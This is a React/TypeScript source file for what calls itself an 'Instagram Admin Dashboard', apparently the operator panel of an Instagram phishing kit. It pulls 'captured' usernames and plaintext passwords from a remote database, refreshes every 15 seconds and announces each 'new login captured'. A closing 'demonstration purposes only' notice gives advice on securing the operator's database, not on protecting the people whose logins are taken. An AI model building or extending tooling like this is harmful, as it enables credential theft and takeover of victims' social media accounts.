
import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { getLoginCredentials, Credential } from '@/services';
import { toast } from 'sonner';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { formatDistanceToNow } from 'date-fns';
import { Loader2, RefreshCw } from 'lucide-react';

const AdminDashboard = () => {
  const [credentials, setCredentials] = useState<Credential[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const navigate = useNavigate();

  useEffect(() => {
    loadCredentials();
    
    // Set up auto-refresh every 15 seconds (reduced from 30 for faster updates)
    const intervalId = setInterval(() => {
      loadCredentials(true);
    }, 15000);
    
    return () => clearInterval(intervalId);
  }, []);

  const loadCredentials = async (isAutoRefresh = false) => {
    try {
      if (!isAutoRefresh) {
        setIsLoading(true);
      } else {
        setIsRefreshing(true);
      }
      
      setError(null);
      console.log('Loading credentials...');
      const result = await getLoginCredentials();
      
      if (result.success) {
        console.log('Successfully loaded credentials:', result.data);
        
        // Check if we have new credentials before updating state
        const hasNewCredentials = result.data.length !== credentials.length;
        setCredentials(result.data);
        
        if (result.data.length === 0 && !isAutoRefresh) {
          toast.info('No credentials found. Waiting for logins...');
        } else if (hasNewCredentials && isAutoRefresh) {
          const newCount = result.data.length - credentials.length;
          if (newCount > 0) {
            toast.success(`${newCount} new login${newCount > 1 ? 's' : ''} captured!`);
          }
        }
      } else {
        setError('Failed to load credentials');
        if (!isAutoRefresh) {
          toast.error('Failed to load credentials');
        }
      }
    } catch (error) {
      console.error('Error loading credentials:', error);
      setError('Something went wrong. Network error or service unavailable.');
      if (!isAutoRefresh) {
        toast.error('Something went wrong. Check your network connection.');
      }
    } finally {
      setIsLoading(false);
      setIsRefreshing(false);
    }
  };

  const handleLogout = () => {
    navigate('/');
  };

  const handleManualRefresh = () => {
    toast.info('Refreshing data...');
    loadCredentials();
  };

  const formatTimestamp = (timestamp: string) => {
    try {
      const date = new Date(timestamp);
      return `${date.toLocaleString()} (${formatDistanceToNow(date, { addSuffix: true })})`;
    } catch (error) {
      console.error('Error formatting date:', error);
      return timestamp || 'Unknown';
    }
  };

  return (
    <div className="min-h-screen bg-black text-white p-8">
      <div className="max-w-6xl mx-auto">
        <div className="flex justify-between items-center mb-8">
          <h1 className="text-2xl font-bold">Instagram Admin Dashboard</h1>
          <Button variant="destructive" onClick={handleLogout}>
            Logout
          </Button>
        </div>
        
        <div className="bg-gray-900 rounded-lg p-6 mb-8">
          <div className="flex justify-between items-center mb-4">
            <h2 className="text-xl font-semibold">Captured Login Credentials</h2>
            <div className="flex items-center">
              <Button 
                onClick={handleManualRefresh} 
                variant="outline" 
                size="sm" 
                className="ml-2"
                disabled={isLoading || isRefreshing}
              >
                {isRefreshing ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Refreshing...
                  </>
                ) : (
                  <>
                    <RefreshCw className="mr-2 h-4 w-4" />
                    Refresh Data
                  </>
                )}
              </Button>
            </div>
          </div>
          
          {isLoading ? (
            <div className="text-center py-10">
              <Loader2 className="h-8 w-8 animate-spin mx-auto mb-4" />
              <p>Loading credentials...</p>
            </div>
          ) : error ? (
            <div className="text-center py-8 text-red-400">
              <p>{error}</p>
              <Button onClick={() => loadCredentials()} variant="outline" className="mt-4">
                Try Again
              </Button>
            </div>
          ) : credentials.length === 0 ? (
            <div className="text-center py-10 border border-dashed border-gray-700 rounded-md">
              <p className="text-gray-400">No credentials found</p>
              <p className="text-sm text-gray-500 mt-2">Login attempts will appear here</p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Username</TableHead>
                    <TableHead>Password</TableHead>
                    <TableHead>Timestamp</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {credentials.map((cred) => (
                    <TableRow key={cred._id}>
                      <TableCell className="font-medium">{cred.username}</TableCell>
                      <TableCell>{cred.password}</TableCell>
                      <TableCell>{formatTimestamp(cred.timestamp)}</TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          )}
          
          {!isLoading && credentials.length > 0 && (
            <div className="mt-4 text-right text-sm text-gray-500">
              {isRefreshing ? (
                <span className="flex items-center justify-end">
                  <Loader2 className="mr-1 h-3 w-3 animate-spin" />
                  Refreshing...
                </span>
              ) : (
                <span>Auto-refreshes every 15 seconds</span>
              )}
            </div>
          )}
        </div>
        
        <div className="bg-red-900/30 border border-red-800 rounded-lg p-6">
          <h2 className="text-xl font-semibold mb-4">Important Notice</h2>
          <p className="mb-4">
            This admin panel is for demonstration purposes only. In a production environment, 
            you should implement proper security measures.
          </p>
          <p>
            The credentials are now stored in a shared remote database. In a real application, you would need to:
          </p>
          <ul className="list-disc list-inside mt-2 space-y-1 text-gray-300">
            <li>Set up a proper MongoDB instance on a secure server</li>
            <li>Use environment variables for the connection string</li>
            <li>Implement proper authentication and authorization</li>
            <li>Set up secure API endpoints for data fetching</li>
            <li>Encrypt sensitive data before storing</li>
          </ul>
        </div>
      </div>
    </div>
  );
};

export default AdminDashboard;
